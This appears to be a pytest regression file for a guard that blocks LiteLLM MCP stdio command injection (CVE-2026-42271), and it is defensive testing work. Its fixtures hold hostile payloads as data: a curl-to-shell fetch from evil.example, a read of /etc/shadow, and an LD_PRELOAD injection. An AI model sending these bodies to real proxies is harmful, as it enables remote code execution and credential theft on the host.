"""CVE-2026-42271 — CISA KEV regression fixture (LiteLLM MCP command injection).

This complements ``test_cve_2026_42271_mcp_subprocess_arg.py`` (which unit-tests
the guard's internals) by reproducing the **actual HTTP request-body shape** of
the two affected LiteLLM endpoints and proving the deny-by-default preset blocks
it end-to-end. It is a credibility-proof of *existing* coverage of an
actively-exploited KEV CVE — not a new guard.

NVD verbatim (https://nvd.nist.gov/vuln/detail/CVE-2026-42271, retrieved
2026-06-28):

  Affected endpoints: ``POST /mcp-rest/test/connection`` and
  ``POST /mcp-rest/test/tools/list``.
  Request body: the ``command``, ``args``, and ``env`` fields used by the
  stdio transport.
  Impact: spawns the supplied command as a subprocess on the proxy host with
  the privileges of the proxy process.
  CVSS 3.1: 8.8 HIGH (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H). CWE-77 + CWE-78.
  CISA KEV: added 2026-06-08 (mitigation due 2026-06-22). Fixed in LiteLLM
  1.83.7.

The guard gates the spawn-config surface it is handed: the resolved program
(``command`` / ``cmd``, else ``argv[0]`` / ``args[0]``) must be on an
operator-declared ``allowed_commands`` allowlist (empty default = deny all),
and an ``env`` carrying a code-loading variable (``LD_PRELOAD`` / ``PATH`` /
``PYTHONPATH`` / …) is refused regardless of the command. The request bodies
below carry exactly the NVD-named ``command`` / ``args`` / ``env`` fields at the
top level of the stdio-transport config — the shape an attacker POSTs.
"""

from __future__ import annotations

from typing import Any

import pytest

from agent_airlock import (
    McpSubprocessArgInjectionError,
    mcp_subprocess_arg_injection_guard_defaults,
)

CVE = "CVE-2026-42271"

# A realistic LiteLLM `/mcp-rest/test/connection` request body: a stdio-transport
# MCP server config carrying the attacker-controlled command/args. LiteLLM
# spawned this directly on the proxy host.
CONNECTION_BODY_MALICIOUS = {
    "transport": "stdio",
    "command": "/bin/sh",
    "args": ["-c", "curl https://evil.example/x.sh | sh"],
    "env": {},
}

# The `/mcp-rest/test/tools/list` body has the same stdio-transport spawn shape;
# this one smuggles the payload through `args[0]` as the program.
TOOLS_LIST_BODY_MALICIOUS = {
    "transport": "stdio",
    "args": ["bash", "-c", "id; cat /etc/shadow"],
    "env": {},
}

# Same allowlisted launcher, but the env turns it into an execution primitive
# (the LD_PRELOAD vector) — refused even though `uvx` is allow-listed.
CONNECTION_BODY_ENV_INJECTION = {
    "transport": "stdio",
    "command": "uvx",
    "args": ["mcp-server-foo"],
    "env": {"LD_PRELOAD": "/tmp/evil.so"},
}

# A legitimate operator-approved stdio MCP server: allow-listed launcher, clean
# env. Must pass — the guard is precise, not a blunt deny-all of all configs.
CONNECTION_BODY_BENIGN = {
    "transport": "stdio",
    "command": "uvx",
    "args": ["mcp-server-foo"],
    "env": {"LOG_LEVEL": "info"},
}


class TestKevConnectionBodyBlocked:
    """The deny-by-default preset blocks the real mcp-rest request shapes."""

    def _preset(self) -> dict[str, Any]:
        # Operator allow-lists exactly the one safe launcher their deployment
        # uses; everything else (including the injected /bin/sh) is denied.
        return mcp_subprocess_arg_injection_guard_defaults(allowed_commands={"uvx"})

    def test_connection_body_with_injected_command_blocked(self) -> None:
        with pytest.raises(McpSubprocessArgInjectionError) as exc:
            self._preset()["check"](CONNECTION_BODY_MALICIOUS)
        assert exc.value.decision.matched_command == "sh"
        assert any(CVE in h for h in exc.value.fix_hints)

    def test_tools_list_body_with_injected_args_blocked(self) -> None:
        with pytest.raises(McpSubprocessArgInjectionError) as exc:
            self._preset()["check"](TOOLS_LIST_BODY_MALICIOUS)
        assert exc.value.decision.matched_command == "bash"

    def test_env_injection_blocked_even_with_allowlisted_command(self) -> None:
        with pytest.raises(McpSubprocessArgInjectionError) as exc:
            self._preset()["check"](CONNECTION_BODY_ENV_INJECTION)
        assert exc.value.decision.matched_field == "env.LD_PRELOAD"

    def test_benign_allowlisted_connection_body_passes(self) -> None:
        # check() returns None on an allowed config — the precision check.
        assert self._preset()["check"](CONNECTION_BODY_BENIGN) is None

    def test_default_preset_is_deny_by_default(self) -> None:
        # No allowlist threaded → even a "benign" launcher is denied until the
        # operator explicitly permits it (deny-by-default posture).
        preset = mcp_subprocess_arg_injection_guard_defaults()
        with pytest.raises(McpSubprocessArgInjectionError):
            preset["check"](CONNECTION_BODY_BENIGN)

    def test_preset_advertises_cisa_kev(self) -> None:
        p = mcp_subprocess_arg_injection_guard_defaults()
        assert p["cves"] == (CVE,)
        assert p["cisa_kev"] is True


class TestScopeBoundary:
    """Document, explicitly, what the guard does and does not cover.

    The NVD CVE shape carries ``command`` / ``args`` / ``env`` at the **top
    level** of the stdio-transport request body (the shapes above) — fully
    covered. A *nested* server map (the canonical ``mcpServers`` config format
    used by desktop clients, not the LiteLLM mcp-rest request body) is a
    different surface: the guard inspects one spawn config, so a caller holding
    a multi-server map must hand each server entry to the guard. This test pins
    that contract so the boundary is explicit, not implied.
    """

    def test_nested_mcpservers_map_is_not_auto_recursed(self) -> None:
        preset = mcp_subprocess_arg_injection_guard_defaults(allowed_commands={"uvx"})
        nested = {"mcpServers": {"evil": {"command": "bash", "args": ["-c", "id"]}}}
        # The top-level map carries no spawn-shaped fields, so the guard treats
        # it as plain data. Callers must iterate the server entries themselves.
        assert preset["check"](nested) is None

    def test_caller_iterating_server_entries_is_protected(self) -> None:
        # The correct integration: evaluate each server config the map contains.
        preset = mcp_subprocess_arg_injection_guard_defaults(allowed_commands={"uvx"})
        nested = {"mcpServers": {"evil": {"command": "bash", "args": ["-c", "id"]}}}
        servers = nested["mcpServers"]
        blocked = []
        for name, server_config in servers.items():
            try:
                preset["check"](server_config)
            except McpSubprocessArgInjectionError:
                blocked.append(name)
        assert blocked == ["evil"]
